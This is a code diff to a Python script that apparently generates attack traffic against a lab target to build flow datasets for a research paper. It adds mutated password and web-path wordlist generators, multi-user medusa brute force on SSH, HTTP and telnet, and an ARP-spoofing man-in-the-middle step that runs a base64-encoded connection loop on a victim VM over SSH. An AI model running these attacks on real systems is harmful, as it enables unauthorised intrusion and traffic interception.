@@ -23,6 +23,7 @@ Options:
 """
 
 import argparse
+import base64
 import json
 import os
 import signal
@@ -47,17 +48,38 @@ WORDLIST_PASS  = "/usr/share/wordlists/rockyou.txt"
 WORDLIST_WEB   = "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
 WORDLIST_USERS = "/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt"
 
-# Minimal inline fallbacks when wordlists are not installed
-FALLBACK_PASSWORDS = [
-    "admin", "root", "password", "123456", "toor", "admin123",
-    "pass", "test", "12345", "qwerty", "letmein", "welcome",
-    "monkey", "dragon", "master", "sunshine", "princess",
+# Seeds used to GENERATE a substantial wordlist when the standard files are not
+# installed. The generator expands these into thousands of entries so the
+# dictionary attack sustains the whole attack window (a handful of entries would
+# be exhausted in a second and leave the window nearly empty, which is what made
+# bruteforce/web non-evaluable in the 2026-09-29 run).
+SEED_PASSWORDS = [
+    "admin", "root", "password", "toor", "pass", "test", "qwerty", "letmein",
+    "welcome", "monkey", "dragon", "master", "sunshine", "princess", "login",
+    "user", "guest", "changeme", "secret", "default", "system", "iot", "device",
+    "camera", "router", "server", "khadas", "raspberry", "ubuntu", "debian",
 ]
-FALLBACK_WEBPATHS = [
-    "admin", "login", "index", "backup", "config", "test",
-    "api", "wp-admin", "phpmyadmin", "shell", "cmd", "upload",
-    "console", "dashboard", "manage", "panel", "status", "info",
+SEED_USERS = [
+    "root", "admin", "administrator", "user", "guest", "test", "oracle",
+    "postgres", "mysql", "ubuntu", "pi", "khadas", "ftp", "www-data",
+    "operator", "support", "backup", "service", "default", "manager",
 ]
+SEED_WEBPATHS = [
+    "admin", "login", "index", "backup", "config", "test", "api", "wp-admin",
+    "phpmyadmin", "shell", "cmd", "upload", "console", "dashboard", "manage",
+    "panel", "status", "info", "images", "css", "js", "assets", "static",
+    "includes", "tmp", "temp", "old", "new", "dev", "staging", "cgi-bin",
+    "wp-content", "wp-includes", "administrator", "user", "users", "account",
+    "private", "public", "data", "db", "sql", "logs", "log", "download",
+]
+
+# How many entries to generate for each list when the standard file is missing.
+GEN_PASSWORDS_N = 6000
+GEN_WEBPATHS_N  = 4000
+
+# Filled by build_attacks(); surfaced in the session report so the paper can
+# state exactly which wordlist (and how many entries) each attack used.
+_WORDLIST_META: Dict[str, Dict] = {}
 
 # ── Data model ────────────────────────────────────────────────────────────────
 
@@ -126,13 +148,77 @@ def make_wordlist(words: List[str]) -> str:
     return f.name
 
 
-def resolve_wordlist(standard_path: str, fallback: List[str]) -> tuple[str, bool]:
-    """Return (path, is_temp). If standard path missing, write fallback to temp."""
+def _expand_passwords(seeds: List[str], n: int) -> List[str]:
+    """Expand seed passwords into ~n unique entries via common mutations
+    (digits, years, capitalization, leet, punctuation). Deterministic."""
+    suffixes = ([""] + [str(d) for d in range(10)]
+                + [f"{d:02d}" for d in range(100)]
+                + [str(y) for y in range(1990, 2027)]
+                + ["!", "@", "#", "123", "1234", "12345", "123456", "1!", "01"])
+    leet = str.maketrans({"a": "4", "e": "3", "i": "1", "o": "0", "s": "5"})
+    out: List[str] = []
+    seen = set()
+    for suf in suffixes:
+        for w in seeds:
+            for base in (w, w.capitalize(), w.upper(), w.translate(leet)):
+                cand = base + suf
+                if cand not in seen:
+                    seen.add(cand)
+                    out.append(cand)
+                    if len(out) >= n:
+                        return out
+    return out
+
+
+def _expand_webpaths(seeds: List[str], n: int) -> List[str]:
+    """Expand seed web paths into ~n unique entries (numbered variants, common
+    file names and extensions). Deterministic."""
+    exts = ["", ".php", ".html", ".bak", ".old", ".txt", ".zip", ".tar.gz",
+            ".json", ".xml", ".asp", ".aspx", ".jsp", "/"]
+    out: List[str] = []
+    seen = set()
+    for i in [""] + [str(k) for k in range(200)]:
+        for w in seeds:
+            for ext in exts:
+                cand = f"{w}{i}{ext}"
+                if cand not in seen:
+                    seen.add(cand)
+                    out.append(cand)
+                    if len(out) >= n:
+                        return out
+    return out
+
+
+def resolve_wordlist(standard_path: str, seeds: List[str], gen_n: int,
+                     kind: str, require: bool) -> tuple[str, bool, dict]:
+    """Return (path, is_temp, meta).
+
+    Uses the installed standard wordlist when present. When it is missing:
+      - require=True  -> abort with install instructions (no silent weak run);
+      - require=False -> GENERATE a gen_n-entry list to a temp file so the
+        attack still sustains the full window, and warn loudly.
+    meta records the source and entry count for the session report."""
     if Path(standard_path).exists():
-        return standard_path, False
-    tmp = make_wordlist(fallback)
-    print(f"  [!] {standard_path} not found — using {len(fallback)}-entry fallback")
-    return tmp, True
+        try:
+            n = sum(1 for _ in open(standard_path, "rb"))
+        except OSError:
+            n = -1
+        return standard_path, False, {"source": standard_path, "entries": n,
+                                      "generated": False}
+    if require:
+        sys.exit(
+            f"[!] Wordlist ausente: {standard_path}\n"
+            f"    --require-wordlists está ligado, então não uso lista gerada.\n"
+            f"    Instale as listas (Arch: `yay -S seclists rockyou`) ou passe\n"
+            f"    --wordlist / --web-wordlist, ou remova --require-wordlists."
+        )
+    words = (_expand_passwords(seeds, gen_n) if kind == "pass"
+             else _expand_webpaths(seeds, gen_n))
+    tmp = make_wordlist(words)
+    print(f"  [!] {standard_path} não encontrado — GERANDO lista de {len(words)} "
+          f"entradas (temp). Para usar a lista real: `yay -S seclists rockyou`.")
+    return tmp, True, {"source": f"generated:{tmp}", "entries": len(words),
+                       "generated": True}
 
 
 def start_capture(pcap_path: str, iface: str, target: str) -> subprocess.Popen:
@@ -297,14 +383,44 @@ def run_attack(
 
 # ── Attack definitions ────────────────────────────────────────────────────────
 
+def _mitm_victim_b64() -> str:
+    """Script rodado NA VÍTIMA (VIM) durante o MITM: gera tráfego TCP e UDP para
+    hosts externos, que atravessa a rota ARP-envenenada e vira fluxo no netflower
+    (só TCP/UDP). Vai em base64 para não sofrer com o quoting aninhado do SSH."""
+    script = (
+        "while true; do\n"
+        "  for hp in 8.8.8.8/53 8.8.8.8/443 1.1.1.1/80 1.1.1.1/443 9.9.9.9/53; do\n"
+        "    timeout 1 bash -c \"echo > /dev/tcp/$hp\" 2>/dev/null\n"
+        "    timeout 1 bash -c \"echo x > /dev/udp/$hp\" 2>/dev/null\n"
+        "  done\n"
+        "  sleep 0.2\n"
+        "done\n"
+    )
+    return base64.b64encode(script.encode()).decode()
+
+
 def build_attacks(target: str, duration: int, wordlist_override: Optional[str],
-                  iface: str, gateway: str, vim_ssh: str) -> Dict:
+                  iface: str, gateway: str, vim_ssh: str,
+                  web_wordlist_override: Optional[str] = None,
+                  require_wordlists: bool = False) -> Dict:
     """Return {name: {"label", "cmds", "duration", "requires"}} for all attack types."""
 
-    wl_pass, wl_pass_temp = resolve_wordlist(
-        wordlist_override or WORDLIST_PASS, FALLBACK_PASSWORDS
+    wl_pass, wl_pass_temp, pass_meta = resolve_wordlist(
+        wordlist_override or WORDLIST_PASS, SEED_PASSWORDS, GEN_PASSWORDS_N,
+        "pass", require_wordlists and not wordlist_override
     )
-    wl_web, wl_web_temp = resolve_wordlist(WORDLIST_WEB, FALLBACK_WEBPATHS)
+    wl_web, wl_web_temp, web_meta = resolve_wordlist(
+        web_wordlist_override or WORDLIST_WEB, SEED_WEBPATHS, GEN_WEBPATHS_N,
+        "web", require_wordlists and not web_wordlist_override
+    )
+    # Lista de usuários da força bruta: tentar vários (user, senha) gera mais
+    # conexões, logo mais fluxos, sem virar flood. É um ataque de dicionário
+    # real (o SSH/serviço é o gargalo, não o tamanho das listas).
+    wl_users = make_wordlist(SEED_USERS)
+    _WORDLIST_META.clear()
+    _WORDLIST_META.update(bruteforce=pass_meta, web=web_meta,
+                          bruteforce_users={"source": f"generated:{wl_users}",
+                                            "entries": len(SEED_USERS)})
 
     attacks = {
 
@@ -346,9 +462,9 @@ def build_attacks(target: str, duration: int, wordlist_override: Optional[str],
             "requires": ["medusa"],
             "duration": duration,
             "cmds": [
-                f"medusa -h {target} -u root -P {wl_pass} -M ssh -t 4",
-                f"medusa -h {target} -u admin -P {wl_pass} -M http -m DIR:/ -t 4",
-                f"medusa -h {target} -u root -P {wl_pass} -M telnet -t 2",
+                f"medusa -h {target} -U {wl_users} -P {wl_pass} -M ssh -t 16",
+                f"medusa -h {target} -U {wl_users} -P {wl_pass} -M http -m DIR:/ -t 16",
+                f"medusa -h {target} -U {wl_users} -P {wl_pass} -M telnet -t 8",
             ],
         },
 
@@ -368,14 +484,20 @@ def build_attacks(target: str, duration: int, wordlist_override: Optional[str],
             "label": "MITM",
             "requires": ["arpspoof"],
             "duration": duration,
+            # ARP-poisoned route between o alvo e o gateway; a vítima (VIM) então
+            # gera tráfego TCP/UDP para hosts externos, que passa pela rota
+            # envenenada e é capturado como fluxo. (Ping/ICMP não vira fluxo: o
+            # netflower parseia só TCP/UDP, o que tornava o MITM não avaliável.)
+            # O loop da vítima vai em base64 para atravessar os três níveis de
+            # aspas (bash local -> ssh -> bash remoto) sem corromper quoting nem
+            # expandir $hp cedo demais.
             "cmds": [
                 "bash -c '"
                 "sysctl -w net.ipv4.ip_forward=1 >/dev/null; "
                 f"arpspoof -i {iface} -t {target} {gateway} >/tmp/arp1.log 2>&1 & echo $! >/tmp/arp1.pid; "
                 f"arpspoof -i {iface} -t {gateway} {target} >/tmp/arp2.log 2>&1 & echo $! >/tmp/arp2.pid; "
                 "sleep 1; "
-                f"{vim_ssh} \"timeout {duration} bash -c \\\"while true; do "
-                "ping -c1 -W1 8.8.8.8 >/dev/null 2>&1; sleep 1; done\\\"\"; "
+                f"{vim_ssh} \"echo {_mitm_victim_b64()} | base64 -d | timeout {duration} bash\"; "
                 "kill $(cat /tmp/arp1.pid) $(cat /tmp/arp2.pid) 2>/dev/null; "
                 "sysctl -w net.ipv4.ip_forward=0 >/dev/null"
                 "'",
@@ -414,7 +536,8 @@ def build_attacks(target: str, duration: int, wordlist_override: Optional[str],
     # Attach wordlist temps for cleanup later
     attacks["_temps"] = {"wl_pass_temp": wl_pass_temp, "wl_web_temp": wl_web_temp,
                          "wl_pass": wl_pass if wl_pass_temp else None,
-                         "wl_web": wl_web if wl_web_temp else None}
+                         "wl_web": wl_web if wl_web_temp else None,
+                         "wl_users": wl_users}
     return attacks
 
 
@@ -438,6 +561,7 @@ def _session_meta(results: List[AttackStats], target: str, iface: str) -> Dict:
         "total_bytes":      sum(r.total_bytes   for r in ran),
         "total_flows":      sum(r.total_flows   for r in ran),
         "total_duration_s": round(sum(r.duration_s for r in ran), 2),
+        "wordlists":        dict(_WORDLIST_META),
     }
 
 
@@ -571,7 +695,12 @@ def main() -> None:
                         help="Comando SSH p/ a VIM 4 gerar tráfego no MITM "
                              "(default: ssh -i ~/.ssh/id_ed25519 -o StrictHostKeyChecking=no luiz_henrique@<target>)")
     parser.add_argument("--wordlist",     default=None,
-                        help="Custom password wordlist path")
+                        help="Custom password wordlist path (overrides the standard file)")
+    parser.add_argument("--web-wordlist", default=None,
+                        help="Custom web-path wordlist (overrides the standard file)")
+    parser.add_argument("--require-wordlists", action="store_true",
+                        help="Aborta se a wordlist padrão não existir, em vez de "
+                             "gerar uma lista temporária (garante uso da lista real)")
     args = parser.parse_args()
 
     if not args.dry_run:
@@ -586,7 +715,9 @@ def main() -> None:
         f"ssh -i {os.path.expanduser('~/.ssh/id_ed25519')} "
         f"-o StrictHostKeyChecking=no luiz_henrique@{args.target}")
     all_attacks = build_attacks(args.target, args.duration, args.wordlist,
-                                args.iface, gateway, vim_ssh)
+                                args.iface, gateway, vim_ssh,
+                                web_wordlist_override=args.web_wordlist,
+                                require_wordlists=args.require_wordlists)
     temps = all_attacks.pop("_temps")
 
     attack_order = ["recon", "dos", "ddos", "bruteforce", "web",
@@ -643,7 +774,7 @@ def main() -> None:
             time.sleep(args.gap)
 
     # Cleanup temp wordlists
-    for key in ("wl_pass", "wl_web"):
+    for key in ("wl_pass", "wl_web", "wl_users"):
         if temps.get(key) and Path(temps[key]).exists():
             try:
                 os.unlink(temps[key])
